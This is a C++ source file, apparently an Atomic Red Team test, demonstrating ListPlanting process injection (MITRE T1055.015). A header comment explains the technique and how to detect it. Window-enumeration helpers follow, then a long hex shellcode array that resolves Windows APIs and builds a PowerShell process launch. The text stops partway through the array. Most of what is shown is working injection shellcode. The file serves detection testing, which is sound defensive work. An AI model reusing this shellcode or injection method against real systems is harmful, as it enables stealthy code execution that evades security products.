/*
MITRE T1055.015
Code injection ListPlanting
Author: Thomas X Meng
ListPlanting is a method of executing arbitrary code in the address space 
of a remote benign process. Code executed via ListPlanting may also evade 
detection from security products since the execution is masked under a legitimate 
process and triggered by SendMessage. Detection: detect the suspicious process call 
child SysListView32 of high privilege victim process detect the PostMessage or 
SendMessage API with suspicious payload that resides in section with RWX permissions 
with behavioural analysis.
Technique used by InvisiMole. 
payload will spwan a message box with "Atomic Red Team" and a notepad.exe
Code reference: cocomelonc
https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/
*/

#define UNICODE
#define _UNICODE
#include <windows.h>
#include <commctrl.h>
#include <iostream>
#pragma comment (lib, "user32.lib")

// Define the NtWriteVirtualMemory prototype
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

// Manually define STATUS_SUCCESS.
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

struct EnumData {
    LPCWSTR title;
    HWND hwnd;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam;
    wchar_t title[256];
    GetWindowText(hwnd, title, 256);
    if (wcsstr(title, data->title) != NULL) {
        data->hwnd = hwnd;
        return FALSE; // Stop enumerating
    }
    return TRUE; // Continue enumerating
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
    EnumData* data = (EnumData*)lParam;
    wchar_t className[256];
    GetClassName(hwnd, className, 256);
    if (wcscmp(className, data->title) == 0) {
        data->hwnd = hwnd;
        return FALSE; 
    }
    return TRUE; 
}

unsigned char my_payload[] =
      {
        0x40,0x55,0x57,0x48,0x81,0xec,0x78,0x05,0x00,0x00,
        0x48,0x8d,0x6c,0x24,0x60,0x65,0x48,0x8b,0x04,0x25,
        0x60,0x00,0x00,0x00,0x48,0x89,0x45,0x00,0x48,0x8b,
        0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x89,0x45,0x08,
        0x48,0x8b,0x45,0x08,0xc6,0x40,0x48,0x00,0x48,0x8b,
        0x45,0x00,0x48,0x8b,0x40,0x18,0x48,0x83,0xc0,0x20,
        0x48,0x89,0x85,0xb0,0x02,0x00,0x00,0x48,0x8b,0x85,
        0xb0,0x02,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,
        0xb8,0x02,0x00,0x00,0x48,0xb8,0x6b,0x00,0x65,0x00,
        0x72,0x00,0x6e,0x00,0x48,0x89,0x45,0x38,0x48,0xb8,
        0x65,0x00,0x6c,0x00,0x33,0x00,0x32,0x00,0x48,0x89,
        0x45,0x40,0x48,0xb8,0x2e,0x00,0x64,0x00,0x6c,0x00,
        0x6c,0x00,0x48,0x89,0x45,0x48,0x48,0xc7,0x45,0x50,
        0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0xd0,0x02,0x00,
        0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0xb0,0x02,
        0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0xb8,0x02,
        0x00,0x00,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,
        0x83,0xe8,0x10,0x48,0x89,0x85,0xd8,0x02,0x00,0x00,
        0xc7,0x85,0xe0,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
        0x48,0x8b,0x85,0xd8,0x02,0x00,0x00,0x48,0x8b,0x40,
        0x60,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,0x48,0x8d,
        0x45,0x38,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0xc7,
        0x85,0xe0,0x02,0x00,0x00,0x01,0x00,0x00,0x00,0x48,
        0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,0x00,0x85,
        0xc0,0x75,0x0f,0xc7,0x85,0xe0,0x02,0x00,0x00,0x00,
        0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,0x8b,
        0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,0x85,
        0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,
        0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,0x7e,
        0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,
        0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,0xeb,0x46,
        0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,0xf8,0x41,
        0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,
        0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,0x02,0x00,
        0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,0x00,0x00,
        0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,0x00,0x88,
        0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,0x85,0xe5,
        0x02,0x00,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,
        0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,0x00,
        0x88,0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc0,
        0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
        0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,
        0x0f,0xb7,0x00,0x66,0x89,0x85,0xec,0x02,0x00,0x00,
        0xeb,0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,
        0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,
        0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,
        0x02,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,
        0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,
        0x00,0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,
        0x85,0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xec,0x02,
        0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x48,
        0x83,0xc0,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,
        0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,0xc0,
        0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb7,
        0x85,0xe8,0x02,0x00,0x00,0x0f,0xb7,0x8d,0xec,0x02,
        0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,0xff,
        0x83,0xbd,0xe0,0x02,0x00,0x00,0x00,0x0f,0x84,0x2e,
        0x01,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
        0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,
        0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,
        0xe8,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x48,
        0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,
        0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,
        0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
        0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,
        0xb7,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,0x00,0xeb,
        0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,0x83,0xf8,
        0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,
        0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0xe4,0x02,
        0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,0x02,0x00,
        0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,0x00,0x00,
        0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,0xbe,0x85,
        0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xe8,0x02,0x00,
        0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,
        0x00,0x88,0x85,0xe4,0x02,0x00,0x00,0x48,0x8b,0x85,
        0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
        0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,
        0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0xec,0x02,0x00,
        0x00,0xeb,0x46,0x0f,0xbe,0x85,0xe4,0x02,0x00,0x00,
        0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0xe4,0x02,
        0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
        0xe4,0x02,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0xe5,
        0x02,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0xe4,0x02,
        0x00,0x00,0x88,0x85,0xe5,0x02,0x00,0x00,0x66,0x0f,
        0xbe,0x85,0xe5,0x02,0x00,0x00,0x66,0x89,0x85,0xec,
        0x02,0x00,0x00,0x0f,0xb7,0x85,0xe8,0x02,0x00,0x00,
        0x0f,0xb7,0x8d,0xec,0x02,0x00,0x00,0x2b,0xc1,0x89,
        0x85,0xe0,0x02,0x00,0x00,0x83,0xbd,0xe0,0x02,0x00,
        0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0xd8,0x02,0x00,
        0x00,0x48,0x89,0x85,0xd0,0x02,0x00,0x00,0xeb,0x25,
        0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,0x00,
        0x48,0x89,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,0x85,
        0xb0,0x02,0x00,0x00,0x48,0x39,0x85,0xb8,0x02,0x00,
        0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,0x85,
        0xd0,0x02,0x00,0x00,0x48,0x89,0x85,0xf0,0x02,0x00,
        0x00,0x48,0xb8,0x6e,0x00,0x74,0x00,0x64,0x00,0x6c,
        0x00,0x48,0x89,0x45,0x38,0x48,0xb8,0x6c,0x00,0x2e,
        0x00,0x64,0x00,0x6c,0x00,0x48,0x89,0x45,0x40,0x48,
        0xc7,0x45,0x48,0x6c,0x00,0x00,0x00,0x48,0xc7,0x45,
        0x50,0x00,0x00,0x00,0x00,0x48,0xc7,0x85,0xf8,0x02,
        0x00,0x00,0x00,0x00,0x00,0x00,0x48,0x8b,0x85,0xb0,
        0x02,0x00,0x00,0x48,0x8b,0x00,0x48,0x89,0x85,0xb8,
        0x02,0x00,0x00,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,
        0x48,0x83,0xe8,0x10,0x48,0x89,0x85,0x00,0x03,0x00,
        0x00,0xc7,0x85,0x08,0x03,0x00,0x00,0x00,0x00,0x00,
        0x00,0x48,0x8b,0x85,0x00,0x03,0x00,0x00,0x48,0x8b,
        0x40,0x60,0x48,0x89,0x85,0xc8,0x02,0x00,0x00,0x48,
        0x8d,0x45,0x38,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,
        0xc7,0x85,0x08,0x03,0x00,0x00,0x01,0x00,0x00,0x00,
        0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb7,0x00,
        0x85,0xc0,0x75,0x0f,0xc7,0x85,0x08,0x03,0x00,0x00,
        0x00,0x00,0x00,0x00,0xe9,0x2e,0x01,0x00,0x00,0x48,
        0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,0x88,
        0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,
        0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,0x00,
        0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,
        0xb7,0x00,0x66,0x89,0x85,0x10,0x03,0x00,0x00,0xeb,
        0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,0x83,0xf8,
        0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,
        0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x0c,0x03,
        0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,0x03,0x00,
        0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,0x00,0x00,
        0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,0xbe,0x85,
        0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x10,0x03,0x00,
        0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,0xb6,
        0x00,0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,
        0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,
        0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,0x00,
        0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x14,0x03,0x00,
        0x00,0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,
        0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,
        0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,
        0x0c,0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,
        0x03,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,
        0x00,0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,
        0xbe,0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x14,
        0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
        0x48,0x83,0xc0,0x02,0x48,0x89,0x85,0xc8,0x02,0x00,
        0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,0x83,
        0xc0,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,0x0f,
        0xb7,0x85,0x10,0x03,0x00,0x00,0x0f,0xb7,0x8d,0x14,
        0x03,0x00,0x00,0x3b,0xc1,0x0f,0x84,0xb5,0xfe,0xff,
        0xff,0x83,0xbd,0x08,0x03,0x00,0x00,0x00,0x0f,0x84,
        0x2e,0x01,0x00,0x00,0x48,0x8b,0x85,0xc8,0x02,0x00,
        0x00,0x48,0x83,0xe8,0x02,0x48,0x89,0x85,0xc8,0x02,
        0x00,0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x48,
        0x83,0xe8,0x02,0x48,0x89,0x85,0xc0,0x02,0x00,0x00,
        0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,0x0f,0xb6,0x00,
        0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,0x85,0xc8,
        0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,0x00,0x00,
        0x00,0x7e,0x13,0x48,0x8b,0x85,0xc8,0x02,0x00,0x00,
        0x0f,0xb7,0x00,0x66,0x89,0x85,0x10,0x03,0x00,0x00,
        0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,0x00,0x83,
        0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,0x03,0x00,
        0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,0x85,0x0c,
        0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,0x0d,0x03,
        0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,0x03,0x00,
        0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,0x0f,0xbe,
        0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,0x10,0x03,
        0x00,0x00,0x48,0x8b,0x85,0xc0,0x02,0x00,0x00,0x0f,
        0xb6,0x00,0x88,0x85,0x0c,0x03,0x00,0x00,0x48,0x8b,
        0x85,0xc0,0x02,0x00,0x00,0x0f,0xb7,0x00,0x3d,0xff,
        0x00,0x00,0x00,0x7e,0x13,0x48,0x8b,0x85,0xc0,0x02,
        0x00,0x00,0x0f,0xb7,0x00,0x66,0x89,0x85,0x14,0x03,
        0x00,0x00,0xeb,0x46,0x0f,0xbe,0x85,0x0c,0x03,0x00,
        0x00,0x83,0xf8,0x41,0x7c,0x1e,0x0f,0xbe,0x85,0x0c,
        0x03,0x00,0x00,0x83,0xf8,0x5a,0x7f,0x12,0x0f,0xbe,
        0x85,0x0c,0x03,0x00,0x00,0x83,0xc0,0x20,0x88,0x85,
        0x0d,0x03,0x00,0x00,0xeb,0x0d,0x0f,0xb6,0x85,0x0c,
        0x03,0x00,0x00,0x88,0x85,0x0d,0x03,0x00,0x00,0x66,
        0x0f,0xbe,0x85,0x0d,0x03,0x00,0x00,0x66,0x89,0x85,
        0x14,0x03,0x00,0x00,0x0f,0xb7,0x85,0x10,0x03,0x00,
        0x00,0x0f,0xb7,0x8d,0x14,0x03,0x00,0x00,0x2b,0xc1,
        0x89,0x85,0x08,0x03,0x00,0x00,0x83,0xbd,0x08,0x03,
        0x00,0x00,0x00,0x75,0x10,0x48,0x8b,0x85,0x00,0x03,
        0x00,0x00,0x48,0x89,0x85,0xf8,0x02,0x00,0x00,0xeb,
        0x25,0x48,0x8b,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,
        0x00,0x48,0x89,0x85,0xb8,0x02,0x00,0x00,0x48,0x8b,
        0x85,0xb0,0x02,0x00,0x00,0x48,0x39,0x85,0xb8,0x02,
        0x00,0x00,0x0f,0x85,0xf9,0xfc,0xff,0xff,0x48,0x8b,
        0x85,0xd0,0x02,0x00,0x00,0x48,0x8b,0x40,0x30,0x48,
        0x89,0x85,0x18,0x03,0x00,0x00,0x48,0x8b,0x85,0x18,
        0x03,0x00,0x00,0x48,0x63,0x40,0x3c,0x48,0x8b,0x8d,
        0x18,0x03,0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,
        0x48,0x89,0x85,0x20,0x03,0x00,0x00,0xb8,0x08,0x00,
        0x00,0x00,0x48,0x6b,0xc0,0x00,0x48,0x8b,0x8d,0x20,
        0x03,0x00,0x00,0x8b,0x84,0x01,0x88,0x00,0x00,0x00,
        0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,0x03,0xc8,
        0x48,0x8b,0xc1,0x48,0x89,0x85,0x28,0x03,0x00,0x00,
        0x48,0x8b,0x85,0x28,0x03,0x00,0x00,0x8b,0x40,0x20,
        0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,0x03,0xc8,
        0x48,0x8b,0xc1,0x48,0x89,0x85,0x30,0x03,0x00,0x00,
        0x48,0xb8,0x47,0x65,0x74,0x50,0x72,0x6f,0x63,0x41,
        0x48,0x89,0x45,0x10,0xc7,0x85,0x38,0x03,0x00,0x00,
        0x00,0x00,0x00,0x00,0x48,0x63,0x85,0x38,0x03,0x00,
        0x00,0x48,0x8b,0x8d,0x30,0x03,0x00,0x00,0x48,0x63,
        0x04,0x81,0x48,0x8b,0x8d,0x18,0x03,0x00,0x00,0x48,
        0x8b,0x55,0x10,0x48,0x39,0x14,0x01,0x74,0x10,0x8b,
        0x85,0x38,0x03,0x00,0x00,0xff,0xc0,0x89,0x85,0x38,
        0x03,0x00,0x00,0xeb,0xcd,0x48,0x8b,0x85,0x28,0x03,
        0x00,0x00,0x8b,0x40,0x24,0x48,0x8b,0x8d,0x18,0x03,
        0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
        0x85,0x40,0x03,0x00,0x00,0x48,0x8b,0x85,0x28,0x03,
        0x00,0x00,0x8b,0x40,0x1c,0x48,0x8b,0x8d,0x18,0x03,
        0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
        0x85,0x48,0x03,0x00,0x00,0x48,0x63,0x85,0x38,0x03,
        0x00,0x00,0x48,0x8b,0x8d,0x40,0x03,0x00,0x00,0x48,
        0x0f,0xbf,0x04,0x41,0x48,0x8b,0x8d,0x48,0x03,0x00,
        0x00,0x48,0x63,0x04,0x81,0x48,0x8b,0x8d,0x18,0x03,
        0x00,0x00,0x48,0x03,0xc8,0x48,0x8b,0xc1,0x48,0x89,
        0x85,0x50,0x03,0x00,0x00,0x48,0x8b,0x85,0x18,0x03,
        0x00,0x00,0x48,0x89,0x85,0x58,0x03,0x00,0x00,0x48,
        0x8b,0x85,0xf8,0x02,0x00,0x00,0x48,0x89,0x85,0x60,
        0x03,0x00,0x00,0x48,0x8b,0x85,0x60,0x03,0x00,0x00,
        0xc7,0x80,0x14,0x01,0x00,0x00,0xff,0xff,0xff,0xff,
        0x48,0x8b,0x85,0xf8,0x02,0x00,0x00,0x48,0x8b,0x40,
        0x30,0x48,0x89,0x85,0x68,0x03,0x00,0x00,0x48,0xb8,
        0x4c,0x6f,0x61,0x64,0x4c,0x69,0x62,0x72,0x48,0x89,
        0x45,0x10,0x48,0xc7,0x45,0x18,0x61,0x72,0x79,0x41,
        0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0x58,0x03,0x00,
        0x00,0xff,0x95,0x50,0x03,0x00,0x00,0x48,0x89,0x85,
        0x70,0x03,0x00,0x00,0x48,0xb8,0x52,0x74,0x6c,0x41,
        0x6c,0x6c,0x6f,0x63,0x48,0x89,0x45,0x10,0x48,0xb8,
        0x61,0x74,0x65,0x48,0x65,0x61,0x70,0x00,0x48,0x89,
        0x45,0x18,0x48,0x8d,0x55,0x10,0x48,0x8b,0x8d,0x68,
        0x03,0x00,0x00,0xff,0x95,0x50,0x03,0x00,0x00,0x48,
        0x89,0x85,0x78,0x03,0x00,0x00,0x48,0xb8,0x52,0x74,
        0x6c,0x43,0x72,0x65,0x61,0x74,0x48,0x89,0x45,0x38,
        0x48,0xb8,0x65,0x50,0x72,0x6f,0x63,0x65,0x73,0x73,
        0x48,0x89,0x45,0x40,0x48,0xb8,0x50,0x61,0x72,0x61,
        0x6d,0x65,0x74,0x65,0x48,0x89,0x45,0x48,0x48,0xc7,
        0x45,0x50,0x72,0x73,0x45,0x78,0x48,0x8d,0x55,0x38,
        0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
        0x03,0x00,0x00,0x48,0x89,0x85,0x80,0x03,0x00,0x00,
        0x48,0xb8,0x4e,0x74,0x43,0x72,0x65,0x61,0x74,0x65,
        0x48,0x89,0x45,0x20,0x48,0xb8,0x55,0x73,0x65,0x72,
        0x50,0x72,0x6f,0x63,0x48,0x89,0x45,0x28,0x48,0xc7,
        0x45,0x30,0x65,0x73,0x73,0x00,0x48,0x8d,0x55,0x20,
        0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
        0x03,0x00,0x00,0x48,0x89,0x85,0x88,0x03,0x00,0x00,
        0x48,0xb8,0x52,0x74,0x6c,0x49,0x6e,0x69,0x74,0x55,
        0x48,0x89,0x45,0x20,0x48,0xb8,0x6e,0x69,0x63,0x6f,
        0x64,0x65,0x53,0x74,0x48,0x89,0x45,0x28,0x48,0xc7,
        0x45,0x30,0x72,0x69,0x6e,0x67,0x48,0x8d,0x55,0x20,
        0x48,0x8b,0x8d,0x68,0x03,0x00,0x00,0xff,0x95,0x50,
        0x03,0x00,0x00,0x48,0x89,0x85,0x90,0x03,0x00,0x00,
        0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,0x00,
        0x48,0x89,0x45,0x60,0x48,0xb8,0x43,0x00,0x3a,0x00,
        0x5c,0x00,0x57,0x00,0x48,0x89,0x45,0x68,0x48,0xb8,
        0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x48,0x89,
        0x45,0x70,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
        0x53,0x00,0x48,0x89,0x45,0x78,0x48,0xb8,0x79,0x00,
        0x73,0x00,0x74,0x00,0x65,0x00,0x48,0x89,0x85,0x80,
        0x00,0x00,0x00,0x48,0xb8,0x6d,0x00,0x33,0x00,0x32,
        0x00,0x5c,0x00,0x48,0x89,0x85,0x88,0x00,0x00,0x00,
        0x48,0xb8,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,
        0x48,0x89,0x85,0x90,0x00,0x00,0x00,0x48,0xb8,0x6f,
        0x00,0x77,0x00,0x73,0x00,0x50,0x00,0x48,0x89,0x85,
        0x98,0x00,0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,0x00,
        0x65,0x00,0x72,0x00,0x48,0x89,0x85,0xa0,0x00,0x00,
        0x00,0x48,0xb8,0x53,0x00,0x68,0x00,0x65,0x00,0x6c,
        0x00,0x48,0x89,0x85,0xa8,0x00,0x00,0x00,0x48,0xb8,
        0x6c,0x00,0x5c,0x00,0x76,0x00,0x31,0x00,0x48,0x89,
        0x85,0xb0,0x00,0x00,0x00,0x48,0xb8,0x2e,0x00,0x30,
        0x00,0x5c,0x00,0x70,0x00,0x48,0x89,0x85,0xb8,0x00,
        0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,0x00,0x65,0x00,
        0x72,0x00,0x48,0x89,0x85,0xc0,0x00,0x00,0x00,0x48,
        0xb8,0x73,0x00,0x68,0x00,0x65,0x00,0x6c,0x00,0x48,
        0x89,0x85,0xc8,0x00,0x00,0x00,0x48,0xb8,0x6c,0x00,
        0x2e,0x00,0x65,0x00,0x78,0x00,0x48,0x89,0x85,0xd0,
        0x00,0x00,0x00,0x48,0xc7,0x85,0xd8,0x00,0x00,0x00,
        0x65,0x00,0x00,0x00,0x48,0x8d,0x55,0x60,0x48,0x8d,
        0x8d,0x98,0x03,0x00,0x00,0xff,0x95,0x90,0x03,0x00,
        0x00,0x48,0xb8,0x5c,0x00,0x3f,0x00,0x3f,0x00,0x5c,
        0x00,0x48,0x89,0x85,0xe0,0x00,0x00,0x00,0x48,0xb8,
        0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x48,0x89,
        0x85,0xe8,0x00,0x00,0x00,0x48,0xb8,0x69,0x00,0x6e,
        0x00,0x64,0x00,0x6f,0x00,0x48,0x89,0x85,0xf0,0x00,
        0x00,0x00,0x48,0xb8,0x77,0x00,0x73,0x00,0x5c,0x00,
        0x53,0x00,0x48,0x89,0x85,0xf8,0x00,0x00,0x00,0x48,
        0xb8,0x79,0x00,0x73,0x00,0x74,0x00,0x65,0x00,0x48,
        0x89,0x85,0x00,0x01,0x00,0x00,0x48,0xb8,0x6d,0x00,
        0x33,0x00,0x32,0x00,0x5c,0x00,0x48,0x89,0x85,0x08,
        0x01,0x00,0x00,0x48,0xb8,0x57,0x00,0x69,0x00,0x6e,
        0x00,0x64,0x00,0x48,0x89,0x85,0x10,0x01,0x00,0x00,
        0x48,0xb8,0x6f,0x00,0x77,0x00,0x73,0x00,0x50,0x00,
        0x48,0x89,0x85,0x18,0x01,0x00,0x00,0x48,0xb8,0x6f,
        0x00,0x77,0x00,0x65,0x00,0x72,0x00,0x48,0x89,0x85,
        0x20,0x01,0x00,0x00,0x48,0xb8,0x53,0x00,0x68,0x00,
        0x65,0x00,0x6c,0x00,0x48,0x89,0x85,0x28,0x01,0x00,
        0x00,0x48,0xb8,0x6c,0x00,0x5c,0x00,0x76,0x00,0x31,
        0x00,0x48,0x89,0x85,0x30,0x01,0x00,0x00,0x48,0xb8,
        0x2e,0x00,0x30,0x00,0x5c,0x00,0x70,0x00,0x48,0x89,
        0x85,0x38,0x01,0x00,0x00,0x48,0xb8,0x6f,0x00,0x77,
        0x00,0x65,0x00,0x72,0x00,0x48,0x89,0x85,0x40,0x01,
        0x00,0x00,0x48,0xb8,0x73,0x00,0x68,0x00,0x65,0x00,
        0x6c,0x00,0x48,0x89,0x85,0x48,0x01,0x00,0x00,0x48,
        0xb8,0x6c,0x00,0x2e,0x00,0x65,0x00,0x78,0x00,0x48,
        0x89,0x85,0x50,0x01,0x00,0x00,0x48,0xb8,0x65,0x00,
        0x20,0x00,0x2d,0x00,0x43,0x00,0x48,0x89,0x85,0x58,
        0x01,0x00,0x00,0x48,0xb8,0x6f,0x00,0x6d,0x00,0x6d,
        0x00,0x61,0x00,0x48,0x89,0x85,0x60,0x01,0x00,0x00,
        0x48,0xb8,0x6e,0x00,0x64,0x00,0x20,0x00,0x22,0x00,
        0x48,0x89,0x85,0x68,0x01,0x00,0x00,0x48,0xb8,0x41,
        0x00,0x64,0x00,0x64,0x00,0x2d,0x00,0x48,0x89,0x85,
        0x70,0x01,0x00,0x00,0x48,0xb8,0x54,0x00,0x79,0x00,
        0x70,0x00,0x65,0x00,0x48,0x89,0x85,0x78,0x01,0x00,
        0x00,0x48,0xb8,0x20,0x00,0x2d,0x00,0x41,0x00,0x73,
        0x00,0x48,0x89,0x85,0x80,0x01,0x00,0x00,0x48,0xb8,
        0x73,0x00,0x65,0x00,0x6d,0x00,0x62,0x00,0x48,0x89,
        0x85,0x88,0x01,0x00,0x00,0x48,0xb8,0x6c,0x00,0x79,
        0x00,0x4e,0x00,0x61,0x00,0x48,0x89,0x85,0x90,0x01,
        0x00,0x00,0x48,0xb8,0x6d,0x00,0x65,0x00,0x20,0x00,
        0x50,0x00,0x48,0x89,0x85,0x98,0x01,0x00,0x00,0x48,
        0xb8,0x72,0x00,0x65,0x00,0x73,0x00,0x65,0x00,0x48,
        0x89,0x85,0xa0,0x01,0x00,0x00,0x48,0xb8,0x6e,0x00,
        0x74,0x00,0x61,0x00,0x74,0x00,0x48,0x89,0x85,0xa8,
